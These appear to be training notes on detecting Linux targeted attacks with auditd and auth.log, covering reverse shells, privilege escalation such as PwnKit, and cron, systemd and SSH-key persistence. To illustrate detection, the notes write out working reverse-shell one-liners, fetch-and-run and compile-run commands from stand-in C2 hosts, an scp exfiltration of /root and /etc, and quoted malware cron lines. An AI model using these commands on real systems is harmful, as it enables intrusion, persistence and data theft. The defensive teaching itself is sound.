# Linux Targeted Attacks — Reverse Shells, Privilege Escalation & Advanced Persistence

## Overview

This document covers manual Linux attack techniques common in targeted intrusions and how to detect them: why attackers move to reverse shells, three common reverse shell methods and how to detect them with auditd, privilege escalation triggers and a pattern-based detection approach (with PwnKit as the example), Linux persistence via cron and systemd, account persistence (new users, backdoored SSH keys, application-layer persistence), and the role of Linux in targeted attacks, espionage, and ransomware.

---

Not all Linux attacks are simple SSH brute force or cryptomining — some are carefully planned, targeted campaigns comparable to advanced Windows breaches.

---

### Attack Convenience

SSH gives an attacker a full, convenient terminal — colors, autocompletion, Ctrl+C support. A breach via an exploit or web vulnerability (e.g., the TryPingMe app from the previous sections) is far more limited: buggy output, execution delays/timeouts, rate limits, network restrictions, and so on.

### Reverse Shells

To overcome those limitations, attackers establish a **reverse shell** — a session from the victim back to the attacker, often the only practical way to continue. Three common methods:

| Command on the Victim | Explanation |
|---|---|
| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` | Victim connects to `10.10.10.10:1337` and launches `bash` for the attacker |
| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Socat alternative — attacker listens at `10.20.20.20:2525` |
| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` | Python alternative — attacker listens at `10.30.30.30:80` |

#### Detecting Reverse Shells

A reverse shell is treated as a **critical alert** — it confirms a live, human-driven breach. Auditd makes this detectable, with a familiar process-tree walk:

```
# Step 1 — find the suspicious command
ausearch -i -x socat
proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
ppid=27806 pid=27808 uid=serviceuser

# Step 2 — trace its parent
ausearch -i --pid 27806
proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:...
ppid=27796 pid=27806 uid=serviceuser

# Step 3 — confirm the origin
ausearch -i --pid 27796
proctitle=/usr/bin/python3 /opt/trypingme/main.py
ppid=1 pid=27796 uid=serviceuser
```

This confirms the reverse shell originated from the **TryPingMe** application itself. Once established, list everything the attacker did through it by pivoting the other direction — all child processes of the shell's PID:

```
ausearch -i -x socat     # the reverse shell process (pid 27808)
ausearch -i --ppid 27808 | grep proctitle
  proctitle=id
  proctitle=uname -a
  proctitle=ls -la .
  [...]
```

---

### Privilege Escalation Basics

Initial Access via a web app or exploit often lands as a **low-privilege service user** — sometimes jailed to a single folder, sometimes unable to download or run anything. Attackers then need **Privilege Escalation**:

| Preceding Discovery (IF) | Privilege Escalation (THEN) |
|---|---|
| `uname -a` shows an old, unpatched Ubuntu 16.04 | Run an exploit like **PwnKit**: `wget http://bad.thm/pwnkit.sh \| bash` |
| `find /bin -perm 4000` finds an `env` binary with the SUID flag | Abuse the SUID bit: `/bin/env /bin/bash -p` |
| `ls /etc/ssh` exposes an unprotected `ssh-backup-key` file | Use it directly: `ssh root@127.0.0.1 -i ssh-backup-key` |

#### Detecting Privilege Escalation

With hundreds of SUID misconfigurations and thousands of unique software vulnerabilities, detecting the exploit mechanics directly isn't practical — instead, detect the **surrounding pattern**. A representative three-stage attack:

```
# Detection 1: A spike of Discovery commands
whoami                                  # Returns "www-data"
id; pwd; ls -la; crontab -l             # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"     # Security tools Discovery
uname -r                                # Returns an old 4.4 kernel

# Detection 2: A download to the temp directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c
gcc /tmp/pwnkit.c -o /tmp/pwnkit
chmod +x /tmp/pwnkit
/tmp/pwnkit

# Detection 3: Data exfiltration with SCP
whoami                                  # Now returns "root"
tar czf dump.tar.gz /root /etc/
scp dump.tar.gz attacker@c2-server.thm:~
```

Even without knowing PwnKit's internals, this pattern alone is enough to flag the activity. To confirm privilege escalation **succeeded**, compare the effective `uid` before and after the exploit:

```
ausearch -i -x pwnkit            # Launched by "serviceuser" (uid field)
  proctitle=/tmp/pwnkit   ppid=24302 pid=24304 uid=serviceuser

ausearch -i --ppid 24304         # PwnKit spawned a root shell (uid field changed!)
  proctitle=bash          ppid=24304 pid=24310 uid=root

ausearch -i --ppid 24310         # Attacker continues the attack as root
  proctitle=whoami        ppid=24310 pid=24312 uid=root
```

---

### Persistence in Linux

Standalone Linux servers can run for years without a reboot, so some attackers skip Persistence entirely. Those seeking long-term access typically add one or two backdoors.

#### Cron Persistence

Cron jobs are Linux's equivalent of Windows Scheduled Tasks and the most popular Linux persistence method.

> **APT29's GoldMax malware** added a line to `/var/spool/cron/<user>` to survive reboots (CrowdStrike):
> ```
> @reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
> ```

> **Rocke cryptominer** — after exploiting public-facing Redis/phpMyAdmin, downloads its mining script from Pastebin and installs it as `/etc/cron.d/root` (Red Canary). The `*/10` schedule re-downloads every 10 minutes to quickly recover if IT deletes the files:
> ```
> echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
> ```

#### Systemd Persistence

Nearly every modern Linux service (DNS, SSH, web services) runs as a `.service` unit under `/lib/systemd/system` or `/etc/systemd/system`. With root, attackers can create their own disguised services.

> **Sandworm's GOGETTER malware** ran via a fake `cloud-online` service (Mandiant):
> ```
> [Unit]
> Description=Initial cloud-online job      # Fake description to mimic a trusted service
> [Service]
> ExecStart=/usr/bin/cloud-online           # GOGETTER malware disguised as a trusted binary
> ```

#### Detecting Cron/Systemd Persistence

Both mechanisms are plain text files, making them straightforward to monitor via auditd — watch file changes **and** the management commands/binaries themselves:

- **Cron files**: `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*`
- **Systemd folders**: `/lib/systemd/system/*`, `/etc/systemd/system/*` (and less common locations)
- **Related commands**: `nano /etc/crontab`, `crontab -e`, `systemctl start|enable <service>`

```
# File change inside /etc/systemd
ausearch -i -f /etc/systemd
  proctitle=vi /etc/systemd/system/malicious.service
  name=/etc/systemd/system/malicious.service   exe=/usr/bin/vi key=systemd

# Execution of crontab command
ausearch -i -x crontab
  proctitle=crontab -e
```

---

### Account Persistence

Malware survivability isn't the only goal — attackers may also want to return later **without leaving any malware behind**.

#### New User Account

If SSH is exposed, attackers can create a new user, add it to a privileged group, and use it for future logins. Detection is simple via `auth.log`, then reconstructing the process tree with auditd:

```
cat /var/log/auth.log | grep -E 'useradd|usermod'
2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001
2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to group 'sudo'
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to shadow group 'sudo'
```

Then pivot into auditd starting from `ausearch -i --ppid 27254` to build the full context.

#### Backdoored SSH Keys

Adding an attacker's public key to a user's `authorized_keys` — the same technique Dota3 used — enables password-free future logins, and the planted key is easy to miss among legitimate ones:

```
cat ~/.ssh/authorized_keys
ssh-ed25519 AAAAC3Nza...oh5fpNy1Gi   # Legitimate key
ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ   # Legitimate key
ssh-ed25519 AAAAC3Nza...IkiINvQt/R   # Backdoor key
```

Best detection: monitor **file changes** to `~/.ssh/authorized_keys` via auditd — not process creation, since many editing methods aren't reliably traced. Notably, `echo [key] >> ~/.ssh/authorized_keys` shows up only as a generic `bash` process, since `echo` is a shell builtin:

```
ausearch -i -f /.ssh/authorized_keys
  proctitle=bash                                    # The "echo" itself is invisible — only "bash" shows
  name=/home/user/.ssh/authorized_keys
  exe=/usr/bin/vi key=systemd
```

#### Application Persistence

If a web admin account (e.g., WordPress) is breached, the attacker can plant a backdoor (e.g., a **WSO web shell**) directly in the application — no cron job, systemd service, or SSH key required. Because this persistence lives entirely at the application layer, **auditd and system logs often never see it at all**. If every system-level persistence check comes back clean but malware keeps reappearing, suspect a compromised public-facing application.

---

### Targeted Attacks — Beyond "Hack and Forget"

Unlike automated cryptominer infections, targeted attacks go after specific companies or governments, and make heavy use of the techniques above.

**Linux as an entry point:** even in a 99%-Windows environment, one compromised Linux server (firewall, web server, mail server) can open the door into the full corporate network.

**Linux in espionage:** state-sponsored groups target Linux systems for their sensitive data or mission-critical role.

> **Kimsuky APT** installed a backdoor on multiple high-value Linux targets using **systemd persistence**, disguised as a service cleverly named `syslogd` (Symantec).

**Linux in ransomware:** Linux ransomware is rising, with **hypervisors** a prime target — compromise the handful of physical Linux hypervisors underneath hundreds of Windows VMs, and every VM is at risk (see the Varonis hypervisor-breach writeup).

### Threat Detection Recap

Across the Linux Threat Detection track, the chain mirrors the Windows one: **Initial Access → Discovery → Collection/Credential Access → Reverse Shell/C2 → Privilege Escalation → Persistence → Impact** — now mapped specifically to Linux tooling (auditd, auth.log, cron, systemd, SSH keys) instead of Windows Event Logs and Sysmon.

---

### Quick Reference

| Topic | Key Detail |
|---|---|
| Reverse shell methods | `bash -i >& /dev/tcp/...`, `socat ... EXEC:'bash'`, Python `pty.spawn("bash")` |
| Reverse shell detection | `ausearch -x <tool>` → trace parent PIDs → confirm origin app |
| Privilege escalation triggers | Old kernel version, SUID misconfigurations, exposed key files |
| PwnKit detection pattern | Discovery spike → `/tmp` download+compile → effective UID change → exfiltration |
| Confirming privesc success | Compare `uid` field before/after the exploit process |
| Cron persistence | `/var/spool/cron/<user>`, `/etc/cron.d/*` — e.g., GoldMax (APT29), Rocke cryptominer |
| Systemd persistence | `/lib/systemd/system/*`, `/etc/systemd/system/*` — e.g., GOGETTER (Sandworm) |
| Persistence file monitoring | Auditd `-f` on cron/systemd paths, plus `crontab`/`systemctl` command usage |
| New backdoor user | `useradd`/`usermod` in `auth.log` → pivot into auditd |
| SSH key backdoor | `~/.ssh/authorized_keys` — monitor file changes, not just process creation (`echo` builtin evades) |
| Application-layer persistence | Web shells (e.g., WSO) — invisible to system logs entirely |
| Linux as entry point | A single compromised Linux server can open a path into an all-Windows network |
| Espionage example | Kimsuky APT, systemd service disguised as `syslogd` |
| Ransomware example | Hypervisor compromise — all hosted VMs put at risk |

---

## Summary

- Attackers who land through an exploit or web vulnerability get a limited, buggy session, so they set up a **reverse shell** (`bash -i >& /dev/tcp/...`, `socat ... EXEC:'bash'`, or Python `pty.spawn("bash")`) — treated as a **critical alert** and detected with auditd by finding the tool (`ausearch -i -x socat`), tracing parent PIDs back to the originating app (here the TryPingMe web app), then listing child processes with `--ppid` to see everything the attacker ran.
- Initial Access often lands as a **low-privilege service user**, so attackers escalate based on Discovery results — an old kernel (PwnKit), a SUID binary like `env`, or an exposed SSH key — and because the exploit mechanics are too varied to detect directly, detection focuses on the **surrounding pattern** (a Discovery spike, a download and compile in `/tmp`, then exfiltration) and confirms success when the `uid` changes from the service user to `root` between the exploit process and its child.
- **Cron** is the most popular Linux persistence method (APT29's GoldMax via `@reboot` in `/var/spool/cron/<user>`; the Rocke cryptominer re-downloading every 10 minutes via `/etc/cron.d/root`) and **systemd** services are the other (Sandworm's GOGETTER via a fake `cloud-online` service); both are plain-text files monitored with auditd on the cron and systemd paths plus `crontab` and `systemctl` command use.
- **Account persistence** includes new backdoor users (spotted via `useradd` and `usermod` in `auth.log`), **backdoored SSH keys** in `authorized_keys` (monitor file changes, since `echo` is a shell builtin and shows only as `bash`), and **application persistence** such as a WSO web shell, which lives at the application layer and is often invisible to auditd and system logs.
- **Targeted attacks** use these techniques heavily: one compromised Linux server can be the entry point into an all-Windows network, state groups like **Kimsuky** hide systemd backdoors as a service named `syslogd`, and Linux **ransomware** targets hypervisors so every hosted VM is at risk; the Linux detection chain mirrors the Windows one but maps to auditd, `auth.log`, cron, systemd, and SSH keys.

